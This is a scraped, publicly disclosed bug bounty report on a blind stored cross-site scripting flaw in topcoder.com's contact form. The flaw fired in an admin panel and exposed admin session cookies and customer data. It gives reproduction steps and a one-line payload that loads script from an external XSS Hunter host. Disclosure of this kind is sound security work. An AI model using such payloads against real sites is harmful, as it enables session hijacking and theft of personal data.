---
title: "Blind stored XSS due to insecure contact form at https://www.topcoder.com leads to leakage of session token and other PII"
author: mase289
url: https://hackerone.com/reports/878145
date_published: 2020-08-07
date_scraped: 2026-11-16
platform: hackerone
disclosed_report: https://hackerone.com/reports/878145
bounty: not stated (no bounty flag)
vuln_class: xss
---

<!-- Raw scraped text below. Public, non-paywalled content only.
     This file is source material, never copied into skills verbatim. -->

# Blind stored XSS due to insecure contact form at https://www.topcoder.com leads to leakage of session token and other PII

## Report metadata (HackerOne public JSON)

- Program: lab45
- Reporter: mase289
- Submitted: 2020-05-19T15:40:22.675Z
- Disclosed: 2020-08-07T17:17:07.746Z
- State: Closed / Resolved
- Weakness: Cross-site Scripting (XSS) - Stored
- Severity: {"rating": "high", "author_type": "User"}

## Report body

## Summary:
I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://www.topcoder.com/contact-us/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets.  I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

1.	Browse to the page at https://www.topcoder.com/contact-us/ and fill out the contact form submitting your blind XSS payload in First name , Last name, Company and description field. 
2.	Submit the form and have and admin access the information.
3.	This will trigger XSS in the admin panel and a notification to the XSS hunter service with details of the event. 

## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]

  * [attachment / reference]

F834746  XSS hunter screenshot revealing mail chimp information

█████ Dom.html you can search through this for my XSS hunter payload `"><script src=https://xvt.xss.ht></script>`

F834748 Full XSS hunter email report

## Impact

An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customer and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.

## Attachments (names only)

- xsshunter_screenshot.png (image/png)
- _XSSHunter__XSS_Payload_Fired_On_https___topcoder--mc4sf.visualforce.com_servlet_servlet.Integration_lid_0661K000008g1R7_ic_1_linkToken_VmpFPSxNakF5TUMwd05TMHlNRlF5TXpvME9Eb3dNQzR3T1RWYSxlTjhEX19URWN1QkduZFUzVnU1.eml (message/rfc822)
